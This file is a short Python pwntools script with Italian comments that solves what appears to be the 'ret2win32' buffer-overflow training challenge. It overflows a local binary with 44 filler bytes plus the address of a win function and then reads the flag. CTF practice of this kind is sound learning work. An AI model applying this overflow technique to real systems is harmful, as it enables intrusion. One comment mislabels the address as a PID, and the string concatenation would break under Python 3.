from pwn import *

#Setto PWNTools per lavorare  con questo Binario:
elf = context.binary= ELF('ret2win32')

#Stampo l'indirizzo target:
info("%#x target", elf.symbols.ret2win)

#Eseguo il binario:
io = process(elf.path)
#Cerco il PID legato alla funzione designata:
ret2win = p32(elf.symbols.ret2win)
#Costruisco il payload con l'offset adeguato:
payload = "A"*44 + ret2win
#Mando il payload:
io.sendline(payload)
#Ricevo fin quando non mi dice la stringa:
io.recvuntil("Here's your flag:")

#Stampo il flag:
flag = io.recvline()
success(flag)
